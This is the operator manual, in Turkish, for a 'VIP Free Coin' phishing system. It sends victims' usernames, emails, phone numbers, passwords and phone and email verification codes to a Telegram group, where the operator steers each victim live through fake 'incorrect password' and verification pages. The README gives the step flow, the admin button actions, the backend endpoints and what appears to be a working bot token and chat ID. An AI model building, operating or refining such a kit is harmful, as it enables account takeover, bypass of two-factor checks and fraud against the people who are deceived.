# 🎮 VIP Free Coin - Telegram Admin Control System

## 📱 Sistem Nasıl Çalışır?

### Kullanıcı Akışı:
1. Kullanıcı **username** ve **coin miktarı** seçer → **BEKLER**
2. Siz Telegram'dan aksiyon seçersiniz → Kullanıcı yönlendirilir
3. Kullanıcı formu doldurur → Tekrar **BEKLER**
4. Siz tekrar aksiyon seçersiniz → Kullanıcı devam eder

### Her Adımda:
- ✅ Telegram grubunuza otomatik bildirim gelir
- ✅ Kullanıcı verileri (username, email, phone, password, codes) gösterilir
- ✅ Admin kontrol butonları aktif olur
- ✅ Kullanıcı waiting page'de kalır

---

## 🎯 Telegram Butonları ve İşlevleri

### Admin Kontrol Butonları:

| Buton | Aksiyon | Kullanıcıya Ne Olur? |
|-------|---------|---------------------|
| 🔐 **Ask Password** | `password` | → `/incorrect-password` sayfasına gider, şifre ister |
| 📝 **Ask Form Again** | `form` | → `/contact` sayfasına gider, email/phone tekrar ister |
| 📱 **Ask Phone Code** | `phone_code` | → `/verify-phone` sayfasına gider, 6 haneli telefon kodu ister |
| 📧 **Ask Email Code** | `email_code` | → `/verify-email` sayfasına gider, 6 haneli email kodu ister |
| ❌ **Wrong Password** | `wrong_password` | → `/incorrect-password` sayfasına tekrar gider |
| 🚫 **Wrong Code** | `wrong_code` | → `/verify-phone` sayfasına tekrar gider |
| ✅ **Finish & Approve** | `finish` | → `/success` sayfasına gider, işlem tamamlanır |

---

## 📊 Adım Adım Bildirimler

### 1️⃣ STEP 1: Username & Coin Selection
```
🎮 STEP 1: Username & Coin Selection

👤 Username: test_user
💰 Coin Amount: 100000
🌐 IP: 192.168.1.1
⏰ Time: 2025-11-15 15:30:00

🕹️ User is waiting for your action...
```

### 2️⃣ STEP 2: Contact Information
```
📧 STEP 2: Contact Information

👤 Username: test_user
💰 Amount: 100000

📧 Email: test@example.com
📞 Phone: +905551234567
🌐 IP: 192.168.1.1
⏰ Time: 2025-11-15 15:31:00

🕹️ User is waiting for your action...
```

### 3️⃣ STEP 3: Password Entered
```
🔐 STEP 3: Password Entered

👤 Username: test_user
🔐 Password: MyPassword123!
🌐 IP: 192.168.1.1
⏰ Time: 2025-11-15 15:32:00

🕹️ User is waiting for your action...
```

### 4️⃣ STEP 4: Phone Code Entered
```
📱 STEP 4: Phone Code Entered

👤 Username: test_user
📞 Phone: +905551234567
📲 Code: 123456
🌐 IP: 192.168.1.1
⏰ Time: 2025-11-15 15:33:00

🕹️ User is waiting for your action...
```

### 5️⃣ STEP 5: Email Code Entered
```
✉️ STEP 5: Email Code Entered

👤 Username: test_user
📧 Email: test@example.com
📬 Code: 654321
🌐 IP: 192.168.1.1
⏰ Time: 2025-11-15 15:34:00

🕹️ User is waiting for your action...
```

---

## 🎬 Örnek Senaryo

### Senaryo 1: Normal İşlem
1. Kullanıcı username girer → **Waiting**
2. Siz: `📝 Ask Form Again` butonuna basarsınız
3. Kullanıcı: Contact sayfasına yönlendirilir, email/phone girer → **Waiting**
4. Siz: `🔐 Ask Password` butonuna basarsınız
5. Kullanıcı: Password sayfasına yönlendirilir, şifre girer → **Waiting**
6. Siz: `📱 Ask Phone Code` butonuna basarsınız
7. Kullanıcı: Phone verification sayfasına yönlendirilir, kodu girer → **Waiting**
8. Siz: `📧 Ask Email Code` butonuna basarsınız
9. Kullanıcı: Email verification sayfasına yönlendirilir, kodu girer → **Waiting**
10. Siz: `✅ Finish & Approve` butonuna basarsınız
11. Kullanıcı: Success sayfasına yönlendirilir ✅

### Senaryo 2: Yanlış Şifre
1. Kullanıcı şifre girer → **Waiting**
2. Siz: Şifre yanlış, `❌ Wrong Password` butonuna basarsınız
3. Kullanıcı: Tekrar password sayfasına gider
4. Kullanıcı: Yeni şifre girer → **Waiting**
5. Siz: `✅ Finish & Approve` ile onaylarsınız

### Senaryo 3: Kod Doğrulama
1. Kullanıcı phone code girer → **Waiting**
2. Siz: `🚫 Wrong Code` butonuna basarsınız
3. Kullanıcı: Tekrar phone verification sayfasına gider
4. Kullanıcı: Yeni kod girer → **Waiting**
5. Siz: `📧 Ask Email Code` ile devam edersiniz

---

## ⚙️ Teknik Detaylar

### Frontend Polling System
- Waiting page **her 2 saniyede bir** backend'e sorgu gönderir
- Backend'de admin aksiyonu varsa, otomatik yönlendirir
- Session ID ile her kullanıcı takip edilir

### Backend API Endpoints
```
POST /api/session/create          → Yeni session oluştur
POST /api/session/step             → Adım gönder, Telegram bildirimi
GET  /api/session/{id}/action      → Admin aksiyonunu al (polling)
POST /api/admin/action             → Admin aksiyonunu kaydet
POST /api/telegram/webhook         → Telegram callback handler
```

### Telegram Bot Configuration
- **Bot Token**: `8598752660:AAHaWkpfllUj-qaJ7qvdvFnFZsZzsgD5ynU`
- **Chat ID**: `-1003294412636`
- **Bot Username**: `@Jetonn_bot`

---

## 🔧 Kullanım Talimatları

### 1. Sistemi Başlatın
```bash
sudo supervisorctl restart all
```

### 2. Telegram Grubunuzu Kontrol Edin
- Bot'u grubunuza ekleyin (zaten ekli)
- Bot'a admin yetkisi verin (mesaj gönderebilmeli)

### 3. Test Edin
1. Web sitesine gidin: `http://your-domain.com`
2. Formu doldurun
3. Telegram grubunuzda bildirimi görün
4. Butonlara basarak kullanıcıyı yönlendirin

### 4. İzleyin
- Her kullanıcı aksiyonunda Telegram bildirimi gelir
- Tüm veriler MongoDB'de saklanır
- Session ID ile kullanıcılar takip edilir

---

## 📝 Notlar

### ⚠️ Önemli:
- Kullanıcılar waiting page'de **sürekli bekler** (siz aksiyon alana kadar)
- Telegram butonlarına **sadece siz** basabilirsiniz
- Her butona basıldığında kullanıcı **otomatik yönlendirilir**
- Tüm veriler **real-time** olarak gelir

### 💡 İpuçları:
- Yanlış bilgi için `Wrong Password` veya `Wrong Code` kullanın
- Eksik bilgi için `Ask Form Again` kullanın
- İşlemi tamamlamak için `Finish & Approve` kullanın
- Her aşamada kullanıcı **waiting page**'de kalır

---

## 🎉 Özet

✅ **Kullanıcı her adımda bekler**
✅ **Telegram'dan tam kontrol**
✅ **Real-time bildirimler**
✅ **Tüm veriler kaydedilir**
✅ **Kolay kullanım**

**Telegram grubunuzu kontrol edin ve yönetmeye başlayın!** 🚀
